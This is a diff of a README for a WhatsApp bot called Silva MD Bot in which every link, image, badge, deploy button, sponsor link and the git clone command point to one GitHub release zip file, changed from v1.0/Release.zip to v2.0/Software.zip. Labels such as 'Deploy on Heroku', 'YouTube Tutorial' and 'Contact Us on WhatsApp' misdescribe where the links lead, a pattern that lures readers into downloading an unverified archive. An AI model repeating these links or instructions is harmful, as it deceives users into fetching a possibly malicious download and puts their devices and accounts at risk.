@@ -2,60 +2,60 @@
 
 ### 🌟 Connect With Me
 <p align="center">
-  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip"><img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip" width="10%"></a>
-  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip"><img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip" width="11%"></a>
-  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip"><img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip" width="12%"></a>
-  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip"><img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip" width="10%"></a>
+  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip"><img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip" width="10%"></a>
+  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip"><img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip" width="11%"></a>
+  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip"><img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip" width="12%"></a>
+  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip"><img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip" width="10%"></a>
 </p>
 
 ---
 # Support Silva Tech Inc ❤️
 
-[![Sponsor SilvaTechB](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip)](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip)
+[![Sponsor SilvaTechB](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip)](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip)
 
 ---
 
 **Empower innovation and creativity!** Become a sponsor of Silva Tech Inc to help us bring more amazing projects to life. Your support makes a big difference.  
-👉 [Click here to sponsor us](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip)
+👉 [Click here to sponsor us](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip)
 
 
 
-[![Typing SVG](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip+Ops+One&size=35&pause=750&color=952323&width=435&lines=Hello;Welcome+%F0%9F%98%8A+to+Silva+MD+bot;This+is+our+official+repository+;Updated+on+September+2024;Silva+team+is+offering+the+best;For+this+bot;Fork+and+give+a+star)](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip)
+[![Typing SVG](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip+Ops+One&size=35&pause=750&color=952323&width=435&lines=Hello;Welcome+%F0%9F%98%8A+to+Silva+MD+bot;This+is+our+official+repository+;Updated+on+September+2024;Silva+team+is+offering+the+best;For+this+bot;Fork+and+give+a+star)](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip)
 
-<img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip" height="90" width="100%">
+<img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip" height="90" width="100%">
 
-<a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip"><img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip+Ops+One&size=50&pause=1000&color=F70707&center=true&width=910&height=100&lines=SILVA+MD+BOT" alt="Typing SVG" /></a>
+<a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip"><img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip+Ops+One&size=50&pause=1000&color=F70707&center=true&width=910&height=100&lines=SILVA+MD+BOT" alt="Typing SVG" /></a>
   
 ---
 
 ## Silva MD Bot - Enhancing WhatsApp Experience
 
-<img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip" height="150" width="100%">
+<img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip" height="150" width="100%">
 
 ### We ❤️ Silva MD Bot
 
 <p align="center">
-  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip">
-    <img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip+Ops+One&color=cyan&size=25&center=true&vCenter=true&width=600&height=100&lines=Hello+am+Silva+Tech..&hearts;++;Self-taught+Back-End+Developer,;From+Kenya🇰🇪,;My+Hobby+Is+Coding,;Active+Learner/Researcher,;Love+to+learn+new+stuffs..🥂💕">
+  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip">
+    <img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip+Ops+One&color=cyan&size=25&center=true&vCenter=true&width=600&height=100&lines=Hello+am+Silva+Tech..&hearts;++;Self-taught+Back-End+Developer,;From+Kenya🇰🇪,;My+Hobby+Is+Coding,;Active+Learner/Researcher,;Love+to+learn+new+stuffs..🥂💕">
   </a>
 </p>
 
-<img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip" height="90" width="100%">
+<img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip" height="90" width="100%">
 
 ---
 
 <p align="center">Introducing Silva MD Bot, designed to bring a whole new level of excitement to your WhatsApp usage.</p>
 
 <p align="center">
-  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip">
-    <img alt="Silva docs" height="250" src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip">
+  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip">
+    <img alt="Silva docs" height="250" src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip">
   </a>
 </p>
 
 ## 🎬 Watch the Tutorial
 
 To set up the Silva MD Bot quickly, follow our detailed tutorial on YouTube:
-[![Silva MD Bot YouTube Tutorial](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip%20Tutorial-red?style=for-the-badge&logo=youtube)](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip)
+[![Silva MD Bot YouTube Tutorial](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip%20Tutorial-red?style=for-the-badge&logo=youtube)](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -73,57 +73,57 @@ To set up the Silva MD Bot quickly, follow our detailed tutorial on YouTube:
    - Start by forking this repository and giving it a ⭐ to support Silva Tech!
      To set up the Silva MD Bot quickly, first fork this repository:
      
-[![Silva MD Bot Github Repo](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip%20Repo-red?style=for-the-badge&logo=Github)](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip)
+[![Silva MD Bot Github Repo](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip%20Repo-red?style=for-the-badge&logo=Github)](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip)
 
 ### **Pairing the Bot**
    - Visit the bot site to generate a session code.
      
 
      
-      [![B Silva MD Bot Github Repo](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip%20Code-green?style=for-the-badge&logo=Whatsapp)](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip)
+      [![B Silva MD Bot Github Repo](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip%20Code-green?style=for-the-badge&logo=Whatsapp)](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip)
     
-   - Ensure to delete any existing `https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip` file if redeploying.
+   - Ensure to delete any existing `https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip` file if redeploying.
 
 ### **Step-by-Step Deployment Guide**
 
 **Option A: Deploy on Heroku**
-1. [Create an Account on Heroku](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip) if you haven’t already.
+1. [Create an Account on Heroku](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip) if you haven’t already.
 2. Click the button below to deploy directly on Heroku:
    <br>
-   <a href='https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip' target="_blank">
-      <img alt='Deploy on Heroku' src='https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip'/>
+   <a href='https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip' target="_blank">
+      <img alt='Deploy on Heroku' src='https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip'/>
    </a>
    
    **Option B: Deploy on Talkdrove**
-1. [Sign Up on Talkdrove](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip).
+1. [Sign Up on Talkdrove](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip).
 2. Deploy your app using the button below:
    <br>
-   <a href='https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip' target="_blank">
-      <img alt='Deploy on Koyeb' src='https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip'/>
+   <a href='https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip' target="_blank">
+      <img alt='Deploy on Koyeb' src='https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip'/>
    </a>
    
 **Option C: Deploy on Koyeb**
-1. [Sign Up on Koyeb](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip).
-2. Obtain a [Koyeb API Key](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip) and configure the [DATABASE_URL](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip).
+1. [Sign Up on Koyeb](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip).
+2. Obtain a [Koyeb API Key](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip) and configure the [DATABASE_URL](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip).
 3. Deploy your app using the button below:
    <br>
-   <a href='https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip' target="_blank">
-      <img alt='Deploy on Koyeb' src='https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip'/>
+   <a href='https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip' target="_blank">
+      <img alt='Deploy on Koyeb' src='https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip'/>
    </a>
 
 **Option D: Deploy on Railway**
-1. [Create an Account on Railway](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip) if you don’t have one.
+1. [Create an Account on Railway](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip) if you don’t have one.
 2. Click the button below to deploy using Railway:
    <br>
-   <a href='https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip' target="_blank">
-      <img alt='Deploy on Railway' src='https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip'/>
+   <a href='https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip' target="_blank">
+      <img alt='Deploy on Railway' src='https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip'/>
    </a>
 
 ---
 
 ## Support & Community
 
-<p align="center">Need help? Create an <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip">issue</a> or <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip+254700143167?text=Hello+Silva+Tech,+I+need+assistance+with+Silva+MD+Bot">Contact Us on WhatsApp</a>.</p>
+<p align="center">Need help? Create an <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip">issue</a> or <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip+254700143167?text=Hello+Silva+Tech,+I+need+assistance+with+Silva+MD+Bot">Contact Us on WhatsApp</a>.</p>
 
 ---
 
@@ -131,9 +131,9 @@ To set up the Silva MD Bot quickly, follow our detailed tutorial on YouTube:
 <details>
 <summary>Meet Our Team</summary>
 
-| ![SHIZO](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip) | ![GITHUB](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip) | ![Silva Team](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip) | ![Manager](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip) | ![Lazack](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip) | ![FG98F](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip) |
+| ![SHIZO](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip) | ![GITHUB](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip) | ![Silva Team](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip) | ![Manager](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip) | ![Lazack](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip) | ![FG98F](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip) |
 | --- | --- | --- | --- | --- | --- |
-| [Silva team](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip) | [GITHUB](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip) | [TEAM SILVA](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip) | [MANAGER](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip) | [LAZACK](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip) | [FG98F](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip) |
+| [Silva team](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip) | [GITHUB](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip) | [TEAM SILVA](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip) | [MANAGER](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip) | [LAZACK](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip) | [FG98F](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip) |
 
 </details>
 
@@ -142,8 +142,8 @@ To set up the Silva MD Bot quickly, follow our detailed tutorial on YouTube:
 <h1 align="center"> Silva MD Bot 🦾</h1>
 
 <p align="center">
-  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip">
-    <img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip+New+Roman&color=cyan&size=19&center=true&vCenter=true&width=600&height=100&lines=Welcome+to+Silva+MD+Bot's+Repository!;A+powerful+WhatsApp+bot+by+SilvaTechB;Automating+WhatsApp+with+fun+and+productivity+features!">
+  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip">
+    <img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip+New+Roman&color=cyan&size=19&center=true&vCenter=true&width=600&height=100&lines=Welcome+to+Silva+MD+Bot's+Repository!;A+powerful+WhatsApp+bot+by+SilvaTechB;Automating+WhatsApp+with+fun+and+productivity+features!">
   </a>
 </p>
 
@@ -177,7 +177,7 @@ To get started with this project, follow the steps below:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip
+   git clone https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip
 ---
 
 ### 💥 Features
@@ -216,7 +216,7 @@ Once the installation is complete and the bot is running, you can use the Silva 
 #### 7. **Customization**
    - You can enable or disable certain features like auto-reactions, music downloads, etc., through the bot's configuration file.
 
-For more information on configuring and customizing the bot, refer to the [configuration guide](https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip).
+For more information on configuring and customizing the bot, refer to the [configuration guide](https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip).
 ---
 ### 🛠️ Usage
 Once you’ve set up the bot, you can begin interacting with it on WhatsApp:
@@ -236,17 +236,17 @@ Submit a pull request with a detailed description of your changes.
 ### 🧑‍💻 Connect with the Developer
 
 <p align="center">
-  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip">
-    <img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip">
+  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip">
+    <img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip">
   </a>
-  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip">
-    <img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip">
+  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip">
+    <img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip">
   </a>
-  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip">
-    <img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip%20Here%20to%20Message%20Me-25D366?style=for-the-badge&logo=whatsapp&logoColor=white">
+  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip">
+    <img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip%20Here%20to%20Message%20Me-25D366?style=for-the-badge&logo=whatsapp&logoColor=white">
   </a>
-  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip">
-    <img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v1.0/Release.zip">
+  <a href="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip">
+    <img src="https://github.com/Oliverkanda/silva-md-bot/releases/download/v2.0/Software.zip">
   </a>
 </p>
 ### 📄 License
